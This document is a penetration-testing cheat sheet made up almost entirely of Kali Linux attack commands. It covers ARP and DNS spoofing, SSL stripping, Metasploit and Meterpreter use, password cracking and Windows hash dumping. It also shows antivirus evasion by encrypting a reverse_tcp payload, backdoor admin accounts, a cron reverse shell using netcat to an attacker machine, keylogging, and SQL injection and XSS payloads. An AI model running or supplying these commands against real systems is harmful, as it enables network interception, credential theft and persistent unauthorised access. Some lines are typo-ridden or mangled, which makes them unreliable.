ARP Spoof
 Set IP forwarding on: 

root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward

Check ARP entries: 

root@kali:~# arp

Spoof ARP:
root@kali:~# arpspoof -i eth0 -t [target IP] [Masquerade IP]

Two commands should be sent. i.e. to intercept packets between a machine and router

root@kali:~# arpspoof -i eth0 -t [machine IP] [router IP]
root@kali:~# arpspoof -i eth0 -t [router IP] [machine IP]
DNS Spoof
 		  			 

Impersonate default gatey with arpspoof and then use this to perform dns spoof:

root@kali:~# dnsspoof -i eth0 -f [file.txt]

file.txt contains:

[ip] [url]

SSL Ettercap
 man in the middle attack for ssl traffic
root@kali:~# ettercap -Ti eth0 -M arp:remote /[gateay ip]/ /[target ip]/
SSL strip
 set up arpspoof and spoof the default gateway 

root@kali:# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

root@kali:# sslstrip -l 8080

Metasploit
 Start metasploit 
root@kali:~# service postgresql start
root@kali:~# service metasploit start
root@kali:~# msfconsole

Search for module:

msf > search [module name]

Use module:

msf > use [modulelocation/moduleName]

Set options: 

set [option] [value]

Set payload:

set payload [payloadlocation/payloadname]

exploit:

exploit

handler:

msf > use multi/handler

Scanner: 

msf > use scanner/[scanner option]

migrate once in meterpreter session: 

meterpreter > run migrate

Advanced parameters:

msf exploit([exploitName]) > show advanced

Show sessions:

msf > sessions -l



Metasploit Command Line
 msfcli can be used to use metasploit inside a script and run module with a quick command

root@kali:~# msfcli -h
Usage: /opt/metasploit/apps/pro/msf3/msfcli [exploit_name] [option=value] [mode]

Standalone payloads with Msfvenom
 msfvenom -h

Password Attacks
 cewl will search online information from a website to extract strings to use a passwords

root@kali:~# cewl --help

Generate lists from a combination of character crunch: 

root@kali:~# crunch --help

online password guessing tool hydra:

root@kali:~# hydra -L userlist.txt -P passwordfile.txt [ip] method

John the ripper - password cracking tool:

root@kali: john [file containing password hash]
(Note: password lists can be used with john the ripper)

root@kali# john [file containing hashes] --wordlist=[file containing clear-text passwords]


Online password cracker: 

https://www.cloudcracker.com/


Windows Attacks on User passwords
 Windows Credential Editor is a tool that can be uploaded to the target to extract the users passwords in clear text

http://www.ampliasecurity.com/research/wcefaq.html.


The Boot.ini file is a text file that contains the boot options for computers with BIOS firmware running NT-based operating system prior to Windows Vista

located at C:\Boot.ini


The Windows Security Accounts Manager (SAM) stores the windows hashes. 
Windows Syskey utility encrypts the password hashes inside the SAM file with 128-bit Rivest Cipher 4 (RC4)
The encryption key for the Syskey utility, called the bootkey, is stored inside of the Windows SYSTEM file.
In Windows XP, the SAM and SYSTEM files are located at C:\Windows\System32\config
Windows XP backs up both the SAM and SYSTEM files to the C:\Windows\repair directory


To get bootkey from system file: 

root@kali:~# bkhive system xpkey.txt

To get hashes from SAM file 

root@kali:~# samdump2 sam xpkey.txt


Social Engineering Toolkit
 
The Social Engineering toolkit has many options:

root@kali:~# setoolkit

Bypassing Anti-virus
 
Virus Total checks which anti-virus flags up your malware:

https://www.virustotal .com/

Note: Any malware put in the site will be entered into the sites register and may be used by anti-virus companies 

To get around Anti-virus, encode the payload:

root@kali:~# msfvenom -l encoders
Note: this lists all encoders available within msfvenom. 


To get around Anti-Virus, can also encrypt the payload:

root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f exe > meterpreter.exe
root@kali:~# cd Hyperion-1.0/
root@kali:~/Hyperion-1.0# wine ../hyperion ../meterpreter.exe bypassavhyperion.exe


To get around anti-Virus, you can use the Veil Evasion framework:

root@kali:~/Veil-Evasion-master# ./Veil-Evasion.py



Meterpreter
 
Upload:

meterpreter > upload [originallocation/originalfile] [uploadlocation/uploadfile]

GetUID:

meterpreter > getuid


Railgun (use Windows APIs)

meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
>> client.railgun.shell32.IsUserAnAdmin

Local privelege escalation: 

meterpreter > getsystem -h

Search for a file 

meterpreter > search -f *password*

Keylogging: 

meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

Net commands (view network information)

meterpreter > shell
C:\Windows\system32> net users
C:\Windows\system32> net localgroup Administrators

dump all hashes: 
meterpreter > hashdump

Incognito (impersonate tokens on a system):
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token [token to impersonate from list]


There are many more commands. Type help to look at them. 

Pivoting
 
Add a route in metasploit 

msf > route add [network] [subnet mask] [session id]


If you don't want to use metasploit attacks:

set up a proxy server:
msf > use auxiliary/server/socks4a

edit the configuration file for ProxyChains at /etc/ proxychains.conf.

 socks4  127.0.0.1 [port number set previously]

 root@kali:~# proxychains [normal instructions] 
 (note: these will now go through pivot)

Persistence
 
You can add a new user:

C:\Documents and Settings\[user]\Desktop> net user [username] [password] /add
C:\Documents and Settings\[user]\Desktop> net localgroup Administrators [username] /add
C:\Documents and Settings\[user]\Desktop> net user [username] [password] /add /domain
C:\Documents and Settings\[user]\Desktop> net group "Domain Admins" [username] /add /domain


Metasploit:

meterpreter > run persistence -h

Linux cron job:

/etc/crontab on your Linux target. 
*/10 * * * * root nc [ip attacker_machine] [port attacker_machine] -e /bin/bash

Web App Testing
 
Proxy:

Burp

Sql injection:

SELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='1'

root@kali:~# sqlmap 

XSS:

lt script rt alert('xss'); lt /script rt

root@kali:~# cd /usr/share/beef-xss/
root@kali:/usr/share/beef-xss# ./beef

Scanning: 

root@kali:~# w3af